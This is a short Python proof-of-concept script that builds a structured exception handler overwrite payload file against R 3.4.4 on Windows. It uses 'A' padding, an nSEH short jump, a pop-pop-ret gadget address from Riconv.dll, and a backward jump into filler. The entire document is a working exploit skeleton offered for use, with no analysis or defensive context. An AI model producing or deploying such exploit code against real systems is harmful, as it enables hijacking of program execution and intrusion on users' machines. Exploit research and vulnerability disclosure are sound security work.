#!/usr/bin/python

import struct

filename="r344.txt"

jmpAbuffer = "\xE9\x6F\xFC\xFF\xFF"

nSEH = "\xEB\x06\x90\x90"            # Jump to the D buffer
SEH  = struct.pack("<I", 0x643c236e) # 0x643c236e : pop esi # pop edi # ret  | asciiprint,ascii {PAGE_EXECUTE_READ} - (C:\Program Files\R\R-3.4.4\bin\i386\Riconv.dll)

buffer  = "A" * 900
buffer += nSEH
buffer += SEH
buffer += jmpAbuffer
buffer += "D" * (12000 - len(buffer))

textfile = open(filename , 'w')
textfile.write(buffer)
textfile.close()


